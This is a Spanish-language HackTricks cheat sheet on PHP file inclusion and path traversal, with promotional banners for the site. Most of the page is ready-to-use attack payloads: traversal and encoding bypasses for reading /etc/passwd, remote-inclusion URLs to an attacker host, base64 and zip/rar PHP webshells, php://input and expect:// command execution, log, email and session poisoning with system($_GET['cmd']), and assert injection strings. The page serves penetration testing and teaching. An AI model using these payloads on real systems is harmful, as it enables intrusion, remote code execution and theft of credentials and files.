# Inclusi√≥n de archivos/Traves√≠a de ruta

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**art√≠culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Invol√∫crate con contenido que explora la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores y actualizaciones importantes de plataformas

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Inclusi√≥n de archivos

**Inclusi√≥n de Archivos Remotos (RFI):** El archivo se carga desde un servidor remoto (Lo mejor: Puedes escribir el c√≥digo y el servidor lo ejecutar√°). En php esto est√° **deshabilitado** por defecto (**allow\_url\_include**).\
**Inclusi√≥n de Archivos Locales (LFI):** El servidor carga un archivo local.

La vulnerabilidad ocurre cuando el usuario puede controlar de alguna manera el archivo que va a ser cargado por el servidor.

**Funciones PHP vulnerables**: require, require\_once, include, include\_once

Una herramienta interesante para explotar esta vulnerabilidad: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Ciegos - Interesantes - Archivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mezclando varias listas de LFI de \*nix y a√±adiendo m√°s rutas, he creado esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Intenta tambi√©n cambiar `/` por `\`\
Intenta tambi√©n a√±adir `../../../../../`

Se puede encontrar una lista que utiliza varias t√©cnicas para encontrar el archivo /etc/password (para verificar si existe la vulnerabilidad) [aqu√≠](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mezcla de diferentes listas de palabras:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Intenta tambi√©n cambiar `/` por `\`\
Intenta tambi√©n quitar `C:/` y a√±adir `../../../../../`

Se puede encontrar una lista que utiliza varias t√©cnicas para encontrar el archivo /boot.ini (para verificar si existe la vulnerabilidad) [aqu√≠](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifica la lista de LFI de Linux.

## LFI b√°sico y bypasses

Todos los ejemplos son para Inclusi√≥n de Archivos Local pero tambi√©n podr√≠an aplicarse a la Inclusi√≥n de Archivos Remota (p√°gina=[http://miservidor.com/phpshellcode.txt\\](http://miservidor.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### secuencias de recorrido despojadas de forma no recursiva
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Byte nulo (%00)**

Burla la adici√≥n de m√°s caracteres al final de la cadena proporcionada (burla de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Esto est√° **resuelto desde PHP 5.4**

### **Codificaci√≥n**

Podr√≠as usar codificaciones no est√°ndar como la codificaci√≥n de URL doble (y otras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Desde la carpeta existente

Tal vez el back-end est√© verificando la ruta de la carpeta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorando Directorios del Sistema de Archivos en un Servidor

El sistema de archivos de un servidor se puede explorar de forma recursiva para identificar directorios, no solo archivos, mediante ciertas t√©cnicas. Este proceso implica determinar la profundidad del directorio y sondear la existencia de carpetas espec√≠ficas. A continuaci√≥n se detalla un m√©todo para lograr esto:

1. **Determinar la Profundidad del Directorio:**
Averiguar la profundidad de su directorio actual al recuperar con √©xito el archivo `/etc/passwd` (aplicable si el servidor es de base Linux). Un ejemplo de URL podr√≠a estar estructurado de la siguiente manera, indicando una profundidad de tres:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondear Carpetas:**
Agrega el nombre de la carpeta sospechosa (por ejemplo, `private`) a la URL, luego navega de regreso a `/etc/passwd`. El nivel adicional de directorio requiere incrementar la profundidad en uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretar los Resultados:**
La respuesta del servidor indica si la carpeta existe:
- **Error / Sin Salida:** La carpeta `private` probablemente no existe en la ubicaci√≥n especificada.
- **Contenidos de `/etc/passwd`:** Se confirma la presencia de la carpeta `private`.

4. **Exploraci√≥n Recursiva:**
Las carpetas descubiertas pueden ser investigadas m√°s a fondo en busca de subdirectorios o archivos utilizando la misma t√©cnica o m√©todos tradicionales de Inclusi√≥n de Archivos Locales (LFI).

Para explorar directorios en diferentes ubicaciones en el sistema de archivos, ajusta la carga √∫til en consecuencia. Por ejemplo, para verificar si `/var/www/` contiene un directorio `private` (asumiendo que el directorio actual est√° a una profundidad de 3), utiliza:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **T√©cnica de Truncamiento de Ruta**

El truncamiento de ruta es un m√©todo utilizado para manipular las rutas de archivos en aplicaciones web. A menudo se emplea para acceder a archivos restringidos al eludir ciertas medidas de seguridad que a√±aden caracteres adicionales al final de las rutas de archivos. El objetivo es crear una ruta de archivo que, una vez modificada por la medida de seguridad, siga apuntando al archivo deseado.

En PHP, varias representaciones de una ruta de archivo pueden considerarse equivalentes debido a la naturaleza del sistema de archivos. Por ejemplo:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` y `/etc/passwd/` se tratan como la misma ruta.
- Cuando los √∫ltimos 6 caracteres son `passwd`, a√±adir un `/` (convirti√©ndolo en `passwd/`) no cambia el archivo objetivo.
- De manera similar, si se a√±ade `.php` a una ruta de archivo (como `shellcode.php`), agregar un `/.` al final no alterar√° el archivo al que se accede.

Los ejemplos proporcionados muestran c√≥mo utilizar el truncamiento de ruta para acceder a `/etc/passwd`, un objetivo com√∫n debido a su contenido sensible (informaci√≥n de cuentas de usuario):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
En estos escenarios, es posible que se necesiten alrededor de 2027 recorridos, pero este n√∫mero puede variar seg√∫n la configuraci√≥n del servidor.

- **Usando Segmentos de Punto y Caracteres Adicionales**:
Las secuencias de recorrido (`../`) combinadas con segmentos de punto adicionales y caracteres pueden utilizarse para navegar por el sistema de archivos, ignorando efectivamente las cadenas a√±adidas por el servidor.

- **Determinando el N√∫mero de Recorridos Requeridos**:
A trav√©s de prueba y error, se puede encontrar el n√∫mero preciso de secuencias `../` necesarias para navegar al directorio ra√≠z y luego a `/etc/passwd`, asegurando que se neutralicen las cadenas a√±adidas (como `.php`) pero que la ruta deseada (`/etc/passwd`) permanezca intacta.

- **Comenzando con un Directorio Falso**:
Es una pr√°ctica com√∫n comenzar la ruta con un directorio inexistente (como `a/`). Esta t√©cnica se utiliza como medida de precauci√≥n o para cumplir con los requisitos de la l√≥gica de an√°lisis de ruta del servidor.

Al emplear t√©cnicas de truncamiento de ruta, es crucial comprender el comportamiento de an√°lisis de ruta del servidor y la estructura del sistema de archivos. Cada escenario podr√≠a requerir un enfoque diferente, y a menudo es necesario realizar pruebas para encontrar el m√©todo m√°s efectivo.

**Esta vulnerabilidad fue corregida en PHP 5.3.**

### **Trucos de evasi√≥n de filtros**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusi√≥n de Archivos Remotos

En php esto est√° deshabilitado por defecto porque **`allow_url_include`** est√° en **Off.** Debe estar en **On** para que funcione, y en ese caso podr√≠as incluir un archivo PHP desde tu servidor y obtener RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si por alguna raz√≥n **`allow_url_include`** est√° **On**, pero PHP est√° **filtrando** el acceso a p√°ginas web externas, [seg√∫n este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), podr√≠as usar, por ejemplo, el protocolo data con base64 para decodificar un c√≥digo PHP en base64 y obtener RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
En el c√≥digo anterior, se agreg√≥ `+.txt` al final porque el atacante necesitaba una cadena que terminara en `.txt`, de modo que la cadena termine con eso y despu√©s de la decodificaci√≥n b64 esa parte devolver√° solo basura y el verdadero c√≥digo PHP ser√° incluido (y por lo tanto, ejecutado).
{% endhint %}

Otro ejemplo **sin usar el protocolo `php://`** ser√≠a:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento ra√≠z de Python

En python en un c√≥digo como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si el usuario pasa una **ruta absoluta** a **`file_name`**, la **ruta anterior simplemente se elimina**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es el comportamiento previsto seg√∫n [la documentaci√≥n](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Si un componente es una ruta absoluta, todos los componentes anteriores se descartan y la uni√≥n contin√∫a desde el componente de ruta absoluta.

## Listado de Directorios en Java

Parece que si tienes una Traves√≠a de Ruta en Java y **solicitas un directorio** en lugar de un archivo, se devuelve un **listado del directorio**. Esto no sucede en otros lenguajes (por lo que s√©).

## Top 25 par√°metros

Aqu√≠ tienes una lista de los 25 principales par√°metros que podr√≠an ser vulnerables a vulnerabilidades de inclusi√≥n de archivos locales (LFI) (desde [este enlace](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando envolturas y protocolos de PHP

### php://filter

Los filtros de PHP permiten realizar operaciones b√°sicas de **modificaci√≥n en los datos** antes de ser le√≠dos o escritos. Hay 5 categor√≠as de filtros:

* [Filtros de cadena](https://www.php.net/manual/en/filters.string.php):
  * `string.rot13`
  * `string.toupper`
  * `string.tolower`
  * `string.strip_tags`: Elimina las etiquetas de los datos (todo lo que est√° entre los caracteres "<" y ">")
  * Ten en cuenta que este filtro ha desaparecido de las versiones modernas de PHP
* [Filtros de conversi√≥n](https://www.php.net/manual/en/filters.convert.php)
  * `convert.base64-encode`
  * `convert.base64-decode`
  * `convert.quoted-printable-encode`
  * `convert.quoted-printable-decode`
  * `convert.iconv.*`: Transforma a una codificaci√≥n diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obtener la **lista de todas las codificaciones** admitidas, ejecuta en la consola: `iconv -l`

{% hint style="warning" %}
Abusando del filtro de conversi√≥n `convert.iconv.*` puedes **generar texto arbitrario**, lo cual podr√≠a ser √∫til para escribir texto arbitrario o hacer que una funci√≥n como la inclusi√≥n de texto arbitrario sea procesada. Para m√°s informaci√≥n, consulta [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de compresi√≥n](https://www.php.net/manual/en/filters.compression.php)
  * `zlib.deflate`: Comprime el contenido (√∫til si se est√° exfiltrando mucha informaci√≥n)
  * `zlib.inflate`: Descomprime los datos
* [Filtros de encriptaci√≥n](https://www.php.net/manual/en/filters.encryption.php)
  * `mcrypt.*`: Obsoleto
  * `mdecrypt.*`: Obsoleto
* Otros filtros
  * Ejecutando en PHP `var_dump(stream_get_filters());` puedes encontrar un par de **filtros inesperados**:
    * `consumed`
    * `dechunk`: revierte la codificaci√≥n chunked de HTTP
    * `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La parte "php://filter" es insensible a may√∫sculas y min√∫sculas
{% endhint %}

### php://fd

Este contenedor permite acceder a los descriptores de archivo que el proceso tiene abierto. Potencialmente √∫til para extraer el contenido de archivos abiertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Tambi√©n puedes usar **php://stdin, php://stdout y php://stderr** para acceder a los **descriptores de archivo 0, 1 y 2** respectivamente (no estoy seguro de c√≥mo esto podr√≠a ser √∫til en un ataque)

### zip:// y rar://

Sube un archivo Zip o Rar con un PHPShell adentro y accede a √©l.\
Para poder abusar del protocolo rar, **necesita ser activado espec√≠ficamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

La pseudoruta `data://` se puede utilizar en ataques de inclusi√≥n de archivos para cargar datos directamente desde la URL en lugar de un archivo en el sistema de archivos. Esto puede ser √∫til para cargar datos codificados en base64 u otros formatos directamente desde la solicitud HTTP.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Ten en cuenta que este protocolo est√° restringido por las configuraciones de php **`allow_url_open`** y **`allow_url_include`**

### expect://

Expect debe estar activado. Puedes ejecutar c√≥digo usando esto:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifica tu carga √∫til en los par√°metros POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un archivo `.phar` se puede utilizar para ejecutar c√≥digo PHP cuando una aplicaci√≥n web utiliza funciones como `include` para cargar archivos. El fragmento de c√≥digo PHP proporcionado a continuaci√≥n demuestra la creaci√≥n de un archivo `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Para compilar el archivo `.phar`, se debe ejecutar el siguiente comando:
```bash
php --define phar.readonly=0 create_path.php
```
Al ejecutarse, se crear√° un archivo llamado `test.phar`, que potencialmente podr√≠a ser aprovechado para explotar vulnerabilidades de Inclusi√≥n de Archivos Locales (LFI).

En casos donde la LFI solo realiza la lectura de archivos sin ejecutar el c√≥digo PHP dentro, a trav√©s de funciones como `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, o `filesize()`, se podr√≠a intentar la explotaci√≥n de una vulnerabilidad de deserializaci√≥n. Esta vulnerabilidad est√° asociada con la lectura de archivos utilizando el protocolo `phar`.

Para comprender detalladamente c√≥mo explotar vulnerabilidades de deserializaci√≥n en el contexto de archivos `.phar`, consulta el documento vinculado a continuaci√≥n:

[Gu√≠a de Explotaci√≥n de Deserializaci√≥n de Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### M√°s protocolos

Consulta m√°s posibles [**protocolos para incluir aqu√≠**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory y php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Escribir en memoria o en un archivo temporal (no est√° claro c√≥mo esto puede ser √∫til en un ataque de inclusi√≥n de archivos)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acceder al sistema de archivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acceder a URLs HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acceder a URLs FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Flujos de compresi√≥n
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Encontrar nombres de ruta que coincidan con un patr√≥n (no devuelve nada imprimible, por lo que no es realmente √∫til aqu√≠)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flujos de audio (No es √∫til para leer archivos arbitrarios)

## LFI a trav√©s de 'assert' de PHP

Los riesgos de Inclusi√≥n de Archivos Locales (LFI) en PHP son notablemente altos al tratar con la funci√≥n 'assert', que puede ejecutar c√≥digo dentro de cadenas. Esto es particularmente problem√°tico si la entrada que contiene caracteres de traves√≠a de directorios como ".." est√° siendo verificada pero no se est√° desinfectando adecuadamente.

Por ejemplo, el c√≥digo PHP podr√≠a estar dise√±ado para prevenir la traves√≠a de directorios de la siguiente manera:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Mientras esto tiene como objetivo detener la traves√≠a, crea involuntariamente un vector para la inyecci√≥n de c√≥digo. Para explotar esto y leer el contenido de archivos, un atacante podr√≠a usar:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Del mismo modo, para ejecutar comandos del sistema arbitrarios, se podr√≠a usar:
```plaintext
' and die(system("id")) or '
```
Es importante **codificar en URL estas cargas √∫tiles**.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Informaci√≥n sobre Hacking**\
Participa en contenido que explora la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones importantes de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!

## Traves√≠a de Ruta PHP a Ciegas

{% hint style="warning" %}
Esta t√©cnica es relevante en casos en los que **controlas** la **ruta del archivo** de una **funci√≥n PHP** que **acceder√° a un archivo** pero no ver√°s el contenido del archivo (como una simple llamada a **`file()`**) pero el contenido no se muestra.
{% endhint %}

En [**esta incre√≠ble publicaci√≥n**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) se explica c√≥mo se puede abusar de una traves√≠a de ruta a ciegas a trav√©s de un filtro PHP para **exfiltrar el contenido de un archivo a trav√©s de un or√°culo de error**.

En resumen, la t√©cnica utiliza la codificaci√≥n **"UCS-4LE"** para hacer que el contenido de un archivo sea tan **grande** que la **funci√≥n PHP que abre** el archivo desencadenar√° un **error**.

Luego, para filtrar el primer car√°cter se utiliza el filtro **`dechunk`** junto con otros como **base64** o **rot13** y finalmente se utilizan los filtros **convert.iconv.UCS-4.UCS-4LE** y **convert.iconv.UTF16.UTF-16BE** para **colocar otros caracteres al principio y filtrarlos**.

**Funciones que podr√≠an ser vulnerables**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo objetivo de solo lectura con esto)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

¬°Para conocer los detalles t√©cnicos, consulta la publicaci√≥n mencionada!

## LFI2RCE

### Inclusi√≥n Remota de Archivos

Como se explic√≥ anteriormente, [**siga este enlace**](./#remote-file-inclusion).

### A trav√©s del archivo de registro de Apache/Nginx

Si el servidor Apache o Nginx es **vulnerable a LFI** dentro de la funci√≥n de inclusi√≥n, podr√≠as intentar acceder a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, establecer dentro del **agente de usuario** o dentro de un **par√°metro GET** un shell de PHP como **`<?php system($_GET['c']); ?>`** e incluir ese archivo

{% hint style="warning" %}
Ten en cuenta que **si usas comillas dobles** para el shell en lugar de **comillas simples**, las comillas dobles se modificar√°n por la cadena "_**quote;**_", **PHP lanzar√° un error** y **no se ejecutar√° nada m√°s**.

Adem√°s, aseg√∫rate de **escribir correctamente la carga √∫til** o PHP lanzar√° un error cada vez que intente cargar el archivo de registro y no tendr√°s una segunda oportunidad.
{% endhint %}

Esto tambi√©n se podr√≠a hacer en otros registros pero **ten cuidado**, el c√≥digo dentro de los registros podr√≠a estar codificado en URL y esto podr√≠a destruir el Shell. El encabezado **autorizaci√≥n "b√°sica"** contiene "usuario:contrase√±a" en Base64 y se decodifica dentro de los registros. El PHPShell podr√≠a ser insertado dentro de este encabezado.\
Otros posibles caminos de registro:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### A trav√©s de Correo Electr√≥nico

**Env√≠a un correo** a una cuenta interna (usuario@localhost) que contenga tu carga √∫til PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e intenta incluirlo en el correo del usuario con una ruta como **`/var/mail/<NOMBRE_USUARIO>`** o **`/var/spool/mail/<NOMBRE_USUARIO>`**

### A trav√©s de /proc/\*/fd/\*

1. Sube muchas shells (por ejemplo: 100)
2. Incluye [http://ejemplo.com/index.php?page=/proc/$PID/fd/$FD](http://ejemplo.com/index.php?page=/proc/$PID/fd/$FD), donde $PID = PID del proceso (puede ser forzado por fuerza bruta) y $FD es el descriptor de archivo (tambi√©n puede ser forzado por fuerza bruta)

### A trav√©s de /proc/self/environ

Como un archivo de registro, env√≠a la carga √∫til en el User-Agent, se reflejar√° dentro del archivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### A trav√©s de la carga

Si puedes cargar un archivo, simplemente inyecta el payload de la shell en √©l (por ejemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para mantener el archivo legible, es mejor inyectar en los metadatos de las im√°genes/doc/pdf

### A trav√©s de la carga de un archivo Zip

Subir un archivo ZIP que contenga un shell PHP comprimido y acceder:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### A trav√©s de sesiones PHP

Verifique si el sitio web utiliza Sesiones PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, estas sesiones se almacenan en archivos _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Establece la cookie a `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utiliza el LFI para incluir el archivo de sesi√≥n de PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Si ssh est√° activo, verifica qu√© usuario se est√° utilizando (/proc/self/status y /etc/passwd) e intenta acceder a **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Los registros del servidor FTP vsftpd se encuentran en **_/var/log/vsftpd.log_**. En el escenario donde existe una vulnerabilidad de Inclusi√≥n de Archivos Locales (LFI) y es posible acceder a un servidor vsftpd expuesto, se pueden considerar los siguientes pasos:

1. Inyectar un payload PHP en el campo de nombre de usuario durante el proceso de inicio de sesi√≥n.
2. Despu√©s de la inyecci√≥n, utilizar el LFI para recuperar los registros del servidor desde **_/var/log/vsftpd.log_**.


### Via php base64 filter (usando base64)

Como se muestra en [este](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) art√≠culo, el filtro base64 de PHP simplemente ignora Non-base64. Puedes usar eso para evadir la verificaci√≥n de la extensi√≥n del archivo: si proporcionas base64 que termina con ".php", simplemente ignorar√° el "." y agregar√° "php" al base64. Aqu√≠ tienes un ejemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### A trav√©s de filtros php (sin necesidad de archivo)

Este [**informe**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que puedes usar **filtros php para generar contenido arbitrario** como salida. Lo que b√°sicamente significa que puedes **generar c√≥digo php arbitrario** para la inclusi√≥n **sin necesidad de escribirlo** en un archivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### A trav√©s de fallo de segmentaci√≥n

**Sube** un archivo que se almacenar√° como **temporal** en `/tmp`, luego en la **misma solicitud**, provoca un **fallo de segmentaci√≥n**, y entonces el **archivo temporal no se eliminar√°** y podr√°s buscarlo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### A trav√©s del almacenamiento de archivos temporales de Nginx

Si encuentras una **Inclusi√≥n Local de Archivos** y **Nginx** est√° en funcionamiento frente a PHP, es posible que puedas obtener RCE con la siguiente t√©cnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

